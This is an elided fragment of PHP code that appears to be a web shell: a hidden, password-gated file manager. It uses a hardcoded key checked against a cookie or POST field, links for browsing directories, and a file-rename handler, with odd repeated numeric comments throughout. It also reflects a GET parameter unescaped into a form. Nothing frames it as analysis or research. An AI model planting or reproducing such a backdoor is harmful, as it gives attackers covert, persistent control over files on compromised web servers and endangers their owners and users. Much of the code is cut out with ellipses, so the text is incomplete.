...
$auth_key = "c6f4136a5e5e6c5d8afee6a4ec3f67ab";
...
$pass = false;
if (isset($_COOKIE['pw_name_99425'])) {
    if(($_COOKIE['pw_name_99425']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_99425'])) {
        if(($_POST['pw_name_99425']) == $auth_key) {
            setcookie("pw_name_99425", $_POST['pw_name_99425']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_99425' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724705683705975 1724705683729357 1724705683900961 1724705683813603
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724705683705975 1724705683729357 1724705683900961 1724705683813603
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724705683705975 1724705683729357 1724705683900961 1724705683813603
            $name = PATH . "/" . $_GET['r'];
